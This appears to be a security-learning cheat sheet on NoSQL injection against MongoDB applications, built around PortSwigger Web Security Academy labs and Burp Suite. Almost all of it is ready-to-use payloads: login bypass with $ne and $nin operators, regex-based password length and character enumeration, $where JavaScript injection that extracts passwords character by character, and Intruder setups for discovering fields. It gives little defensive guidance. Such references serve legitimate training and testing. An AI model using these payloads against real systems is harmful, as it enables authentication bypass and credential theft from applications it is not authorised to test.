# ------------------------------------------------------------
#                       NO-SQL (MongoDB)
# ------------------------------------------------------------

## Introduction
NoSQL databases store data in document format instead of traditional SQL tables.

Example document structure:

```json
{
  "_id": ObjectId("5f077332de2cdf808d26cd74"),
  "username": "lphillips",
  "first_name": "Logan",
  "last_name": "Phillips",
  "age": "65",
  "email": "lphillips@example.com"
}
```

---

# Common NoSQL Operators

| Operator | Description |
|----------|-------------|
| `$where` | Matches documents using JavaScript expressions |
| `$ne` | Matches values not equal to specified value |
| `$in` | Matches values inside an array |
| `$regex` | Matches using regular expressions |

---

# Basic NoSQL Query Examples

```php
['last_name' => 'Sandler']
```

```php
['gender' => 'male', 'last_name' => 'Phillips']
```

```php
['age' => ['$lt' => '50']]
```

---

# Login Bypass Using NoSQL Injection

Suppose application query is:

```php
['username'=>$user, 'password'=>$pass]
```

Possible bypass:

```php
$user = ['$ne'=>'xxxx']
$pass = ['$ne'=>'yyyy']
```

POST Request Format:

```http
user[$ne]=xxxx&pass[$ne]=yyyy
```

---

# Additional Authentication Bypass Payloads

```php
['username'=>['$nin'=>['admin']], 'password'=>['$ne'=>'aweasdf']]
```

HTTP Format:

```http
user[$nin][]=admin&pass[$ne]=kuchBe
```

---

```php
['username'=>['$nin'=>['admin','jude']], 'password'=>['$ne'=>'aweasdf']]
```

HTTP Format:

```http
user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=kuchBe
```

---

# Password Length Enumeration

```http
user=admin&pass[$regex]=^.{7}$
```

If successful, password length is likely 7.

---

# Password Character Guessing

Suppose password length is 5:

```http
user=admin&pass[$regex]=^c....$
```

This checks whether password starts with `c`.

---

# Detecting NoSQL Injection

Use single quote test:

```http
admin'
```

Additional payloads:

```http
admin' && 0 && 'x
```

```http
admin' && 1 && 'x
```

```http
admin'||1||'
```

---

# NoSQL Injection in MongoDB Authentication

Example login:

```json
username:"wiener"
password:"peter"
```

Bypass example:

```json
username:"wiener",
password:{"$ne":"kuchbe"}
```

Meaning:
Password can be anything except `kuchbe`.

---

# Regex Username Matching

```json
username:{"$regex":"^a"},
password:"anything"
```

Finds usernames starting with letter `a`.

---

# JavaScript Injection Using $where

Example vulnerable URL:

```http
https://insecure-website.com/user/lookup?username=admin
```

Generated query:

```json
{"$where":"this.username == 'admin'"}
```

---

# Extract Password Character by Character

```javascript
admin' && this.password[0] == 'a' || 'a'=='b
```

---

# Check Whether Password Contains Digits

```javascript
admin' && this.password.match(/\d/) || 'a'=='b
```

---

# URL-Based NoSQL Injection Examples

Example URL:

```http
https://web-security-academy.net/user/lookup?user=wiener
```

## Negative Condition

```http
user=wiener' && '1'=='2
```

---

## Positive Condition

```http
user=wiener' && '1'=='1
```

---

# Password Length Guessing

```http
user=administrator' && this.password.length < 30 || 'a'=='b
```

Reduce number until invalid user occurs.

---

# Finding Existing Fields

Existing field check:

```javascript
admin' && this.username!='
```

Non-existing field:

```javascript
admin' && this.foo!='
```

---

# Checking JavaScript Evaluation

Example login URL:

```http
https://web-security-academy.net/login
```

Password payload:

```json
"password":{"$ne":"Invalid"}
```

If response changes, `$ne` is evaluated.

---

# Testing $where Evaluation

False condition:

```json
"$where":"0"
```

True condition:

```json
"$where":"1"
```

---

# Discovering Object Fields Using Intruder

Payload:

```json
"$where":"Object.keys(this)[1].match('^.{}.*')"
```

Intruder payload position:

```json
"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
```

Attack Type:
- Cluster Bomb

Payloads:
- Numbers: 0-20
- Lowercase letters
- Uppercase letters
- Digits 0-9

---

# Discover Password Field

```json
"$where":"Object.keys(this)[2].match('^.{§§}§§.*')"
```

---

# NoSQL Injection in PortSwigger Labs

Example category parameter:

```http
category=Clothing%2c+shoes+and+accessories
```

Payloads:

```http
Clothing%2c+shoes+and+accessories'
```

```http
Clothing, shoes and accessories' + 'x' + '
```

```http
Clothing, shoes and accessories' && 0 && 'x
```

```http
Clothing, shoes and accessories' && 1 && 'x
```

```http
Clothing, shoes and accessories'||1||'
```

---

# Quick Summary

✔ NoSQL Injection  
✔ MongoDB Injection  
✔ Authentication Bypass  
✔ Regex Exploitation  
✔ JavaScript Injection  
✔ Password Enumeration  
✔ Field Enumeration  
✔ Burp Suite Testing  
✔ PortSwigger Labs  
✔ Authentication Manipulation  

# ------------------------------------------------------------
